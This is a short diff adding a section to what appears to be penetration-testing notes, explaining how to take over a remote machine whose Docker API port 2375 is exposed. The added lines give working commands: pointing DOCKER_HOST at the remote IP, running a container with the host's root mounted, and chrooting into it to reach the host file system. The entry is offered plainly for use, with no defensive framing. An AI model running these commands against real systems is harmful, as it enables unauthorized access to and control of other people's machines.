@@ -81,3 +81,12 @@ strings heap.dump
 
 
 
+## 4. Use Case Docker port exposed on remote machine&#x20;
+
+if there is open docker port in remote machine we can connect to there.&#x20;
+
+* `export DOCKER_HOST=REMOTE_HOST_IP:2375`
+* `docker run -it -v /:/host ubuntu:22.04 bash`
+* `chroot /host`\
+  \
+  `Now we are in remote machine file system.`
